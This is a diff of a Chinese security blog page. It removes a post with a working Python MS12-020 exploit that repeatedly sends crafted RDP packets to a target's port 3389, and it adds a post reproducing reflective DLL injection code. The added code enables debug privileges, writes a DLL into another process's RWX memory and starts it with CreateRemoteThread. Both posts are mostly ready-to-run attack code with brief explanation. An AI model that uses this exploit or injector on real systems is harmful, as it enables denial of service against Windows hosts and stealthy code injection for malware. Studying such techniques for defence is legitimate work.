@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>构造MS12-020攻击脚本 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="构造MS12-020攻击脚本 | 九世的博客">
+  <title>反射DLL注入研究 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="反射DLL注入研究 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1500,9 +1500,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-构造MS12-020攻击脚本" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-反射DLL注入研究" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">构造MS12-020攻击脚本</h1>
+        <h1 class="article-title">反射DLL注入研究</h1>
     
     <div class="article-meta">
         
@@ -1511,14 +1511,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-11-25 08:40</time>
+        创建时间:<time class="date" title="更新时间: 2020-10-19 14:07:53">2020-10-19 13:43</time>
         
     </div>
     <div class="article-meta">
@@ -1540,7 +1540,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1555,65 +1555,255 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>放假回来意外的想写一个MS12-020的脚本，然后便去github搜了代码，看了一下。get到思路了<br>mmp，今天还要开家长会？？？ 凉凉= =<br><img src="https://s1.ax1x.com/2018/11/25/FkZbbd.md.jpg" alt="FkZbbd.md.jpg"></p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=874077433&auto=1&height=430"></iframe>
+        <p>代码来源于:<a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主要文件inject.c<br><img src="https://s1.ax1x.com/2020/10/19/0vb9Gq.png" alt=""></p>
+<p>code如下</p>
+<pre><code class="C">#define WIN32_LEAN_AND_MEAN
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &quot;LoadLibraryR.h&quot;
 
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>MS12-020漏洞公告与相关的bud：<a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-020" target="_blank" rel="noopener">Microsoft Security Bulletin MS12-020 - Critical | Microsoft D补丁</a><br>MS12-020的exp：<a href="https://github.com/traceur/MS12-020_POC/blob/master/MS12-020_exploit.py" target="_blank" rel="noopener">MS12-020_POC/MS12-020_exploit.py at master · traceur/MS12-020_POC · GitHub</a></p>
-<p>从上面的链接得到shellcode:</p>
-<pre><code>buf=&quot;030000130ee000000000000100080000000000&quot;
-buf1=&quot;030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0&quot;
-buf2=&quot;0300000802f08028&quot;
-</code></pre><p>具体代码：</p>
-<pre><code>import socket
-import binascii
-from secistsploit.core.exploit import *
-from secistsploit.core.tcp.tcp_client import TCPClient
+#pragma comment(lib,&quot;Advapi32.lib&quot;)
 
+#define BREAK_WITH_ERROR( e ) { printf( &quot;[-] %s. Error=%d&quot;, e, GetLastError() ); break; }
 
-class Exploit(TCPClient):
-    __info__ = {
-        &quot;name&quot;: &quot;MS12-020_exploit&quot;,
-        &quot;description&quot;: &quot;Origin of loopholes锛歨ttps://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020&quot;,
-        &quot;authors&quot;: (
-            &quot;demonsec&quot;,
-        ),
-        &quot;references&quot;: (
-             &quot;www.ggsec.cn &quot;
-             &quot;www.secist.com&quot;
-        ),
+// Simple app to inject a reflective DLL into a process vis its process ID.
+int main( int argc, char * argv[] )
+{
+    HANDLE hFile          = NULL;
+    HANDLE hModule        = NULL;
+    HANDLE hProcess       = NULL;
+    HANDLE hToken         = NULL;
+    LPVOID lpBuffer       = NULL;
+    DWORD dwLength        = 0;
+    DWORD dwBytesRead     = 0;
+    DWORD dwProcessId     = 0;
+    TOKEN_PRIVILEGES priv = {0};
+
+#ifdef WIN_X64
+    char * cpDllFile  = &quot;reflective_dll.x64.dll&quot;;
+#else
+#ifdef WIN_X86
+    char * cpDllFile  = &quot;reflective_dll.dll&quot;;
+#else WIN_ARM
+    char * cpDllFile  = &quot;reflective_dll.arm.dll&quot;;
+#endif
+#endif
+
+    do
+    {
+        // Usage: inject.exe [pid] [dll_file]
+
+        if( argc == 1 )
+            dwProcessId = GetCurrentProcessId();
+        else
+            dwProcessId = atoi( argv[1] );
+
+        if( argc &gt;= 3 )
+            cpDllFile = argv[2];
+
+        hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); //创建dll或读取dll
+        if( hFile == INVALID_HANDLE_VALUE )
+            BREAK_WITH_ERROR( &quot;Failed to open the DLL file&quot; );
+
+        dwLength = GetFileSize( hFile, NULL ); //获取文件大小
+        if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
+            BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );
+
+        lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength ); //从堆分配一块内存 (GetProcessHeap() 检索到调用进程的默认堆的句柄)
+        if( !lpBuffer )
+            BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );
+
+        if( ReadFile( hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL ) == FALSE ) //读取文件
+            BREAK_WITH_ERROR( &quot;Failed to alloc a buffer!&quot; );
+
+        if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) ) //获取当前token句柄
+        {
+            priv.PrivilegeCount           = 1;
+            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+            if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid ) )
+                AdjustTokenPrivileges( hToken, FALSE, &amp;priv, 0, NULL, NULL );
+
+            CloseHandle( hToken );
+        }
+
+        hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
+        if( !hProcess )
+            BREAK_WITH_ERROR( &quot;Failed to open the target process&quot; );
+
+        hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL ); //hProcess=&gt;进程句柄，lpBuffer=&gt;堆内存空间，dwlength=&gt;dll文件大小
+        if( !hModule )
+            BREAK_WITH_ERROR( &quot;Failed to inject the DLL&quot; );
+
+        printf( &quot;[+] Injected the &#39;%s&#39; DLL into process %d.&quot;, cpDllFile, dwProcessId );
+
+        WaitForSingleObject( hModule, -1 );
+
+    } while( 0 );
+
+    if( lpBuffer )
+        HeapFree( GetProcessHeap(), 0, lpBuffer );
+
+    if( hProcess )
+        CloseHandle( hProcess );
+
+    return 0;
+}
+
+</code></pre>
+<p>整个流程如下：</p>
+<ul>
+<li>首先判断命令行参数总数量是否只有一个,如果命令行参数大于或等于三，则dwProcessId为指定PID<ul>
+<li>dwProcessId为当前进程PID</li>
+</ul>
+</li>
+<li>CreateFileA读取对应的DLL</li>
+<li>GetFileSize获取DLL文件大小</li>
+<li>HeapAlloc从堆分配一块内存 （这里使用GetProcessHeap，检索到调用进程的默认堆的句柄）</li>
+<li>ReadFile读取DLL</li>
+<li>OpenProcessToken当前TOKEN</li>
+<li>OpenProcess打开进程</li>
+<li>调用LoadLibraryR.c里的LoadRemoteLibrary函数dll注入<ul>
+<li>GetReflectiveLoaderOffset返回对应PE位数的地址</li>
+<li>VirtualAllocEx分配内存</li>
+<li>WriteProcessMemory内存数据写入</li>
+<li>CreateRemoteThread创建远程进程</li>
+</ul>
+</li>
+</ul>
+<p>LoadRemoteLibraryR</p>
+<pre><code class="C">HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter ) //hProcess=&gt;进程句柄，lpBuffer=&gt;堆内存空间，dwlength=&gt;dll文件大小
+{
+    BOOL bSuccess                             = FALSE;
+    LPVOID lpRemoteLibraryBuffer              = NULL;
+    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+    HANDLE hThread                            = NULL;
+    DWORD dwReflectiveLoaderOffset            = 0;
+    DWORD dwThreadId                          = 0;
+
+    __try
+    {
+        do
+        {
+            if( !hProcess  || !lpBuffer || !dwLength )
+                break;
+
+            // check if the library has a ReflectiveLoader...
+            dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer ); //自定义的GetReflectiveLoaderOffset函数
+            if( !dwReflectiveLoaderOffset )
+                break;
+
+            // alloc memory (RWX) in the host process for the image...
+            lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
+            if( !lpRemoteLibraryBuffer )
+                break;
+
+            // write the image into the host process...
+            if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) ) //写入内存
+                break;
+
+            // add the offset to ReflectiveLoader() to the remote library address...
+            lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );
+
+            // create a remote thread in the host process to call the ReflectiveLoader!
+            hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId ); //创建远程线程
+
+        } while( 0 );
 
     }
+    __except( EXCEPTION_EXECUTE_HANDLER )
+    {
+        hThread = NULL;
+    }
 
-    RHOSTS=OptIP(&quot;&quot;,&quot;Set RHOSTS IP&quot;)
-    RPORT=OptPort(3389,&quot;Set RHOSTS Port&quot;)
-    def__init__(self):
-        self.endianness = &quot;&lt;&quot;
-    def run(self):
-        RHOSTS=(self.RHOSTS)
-        RPORT=(self.RPORT)
-        print(&#39;[+] RHOSTS:{}&#39;.format(RHOSTS))
-        print(&#39;[+] RPORT:{}&#39;.format(RPORT))
-        if RHOSTS!=&#39;&#39; and RPORT!=&#39;&#39;:
-            buf = binascii.unhexlify(&quot;030000130ee000000000000100080000000000&quot;)
-            buf1 = binascii.unhexlify(&quot;030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0&quot;)
-            buf2 = binascii.unhexlify(&quot;0300000802f08028&quot;) //通过binascii.unhexlify转换成16进制exp
-            shellcode = buf + buf1 + buf2 //根据exp上的将buf组合起来
+    return hThread;
+}
+</code></pre>
+<p>GetReflectiveLoaderOffset函数 （返回对应的位数和地址）</p>
+<pre><code class="c">DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
+{
+    UINT_PTR uiBaseAddress   = 0;
+    UINT_PTR uiExportDir     = 0;
+    UINT_PTR uiNameArray     = 0;
+    UINT_PTR uiAddressArray  = 0;
+    UINT_PTR uiNameOrdinals  = 0;
+    DWORD dwCounter          = 0;
+#ifdef WIN_X64
+    DWORD dwCompiledArch = 2;
+#else
+    // This will catch Win32 and WinRT.
+    DWORD dwCompiledArch = 1;
+#endif
 
+    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;
 
-            while True:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((RHOSTS, RPORT))
-                    s.sendall(shellcode)
-                    rec = s.recv(1024)
-                    s.close()
-                    print(&#39;[^] Attack completion&#39;)
-                except:
-                    print(&#39;[+] Successed!&#39;)
-                    exit()
-</code></pre><p>测试结果：<br><img src="https://s1.ax1x.com/2018/11/25/FkZLVA.md.jpg" alt="FkZLVA.md.jpg"></p>
-<p><img src="https://s1.ax1x.com/2018/11/25/FkZOUI.md.jpg" alt="FkZOUI.md.jpg"></p>
-<p>转载请声明：转自422926799.github.io</p>
+    // get the File Offset of the modules NT Header
+    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;
+
+    // currenlty we can only process a PE file which is the same type as the one this fuction has  
+    // been compiled as, due to various offset in the PE structures being defined at compile time.
+    if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == 0x010B ) // PE32
+    {
+        if( dwCompiledArch != 1 )
+            return 0;
+    }
+    else if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == 0x020B ) // PE64
+    {
+        if( dwCompiledArch != 2 )
+            return 0;
+    }
+    else
+    {
+        return 0;
+    }
+
+    // uiNameArray = the address of the modules export directory entry
+    uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
+
+    // get the File Offset of the export directory
+    uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );
+
+    // get the File Offset for the array of name pointers
+    uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );
+
+    // get the File Offset for the array of addresses
+    uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );
+
+    // get the File Offset for the array of name ordinals
+    uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );    
+
+    // get a counter for the number of exported functions...
+    dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;
+
+    // loop through all the exported functions to find the ReflectiveLoader
+    while( dwCounter-- )
+    {
+        char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));
+
+        if( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) != NULL )
+        {
+            // get the File Offset for the array of addresses
+            uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );    
+
+            // use the functions name ordinal as an index into the array of name pointers
+            uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );
+
+            // return the File Offset to the ReflectiveLoader() functions code...
+            return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );
+        }
+        // get the next exported function name
+        uiNameArray += sizeof(DWORD);
+
+        // get the next exported function name ordinal
+        uiNameOrdinals += sizeof(WORD);
+    }
+
+    return 0;
+}
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/10/19/0vq59I.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1623,12 +1813,12 @@ class Exploit(TCPClient):
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>构造MS12-020攻击脚本</p>
+    <p><span class="copy-title">文章标题:</span>反射DLL注入研究</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-11-25, 08:40:44</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/82b8ed8c.html" title="构造MS12-020攻击脚本">http://422926799.github.io/posts/82b8ed8c.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-10-19, 13:43:45</p>
+    <p><span class="copy-title">最后更新:</span>2020-10-19, 14:07:53</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/907443e1.html" title="反射DLL注入研究">http://422926799.github.io/posts/907443e1.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
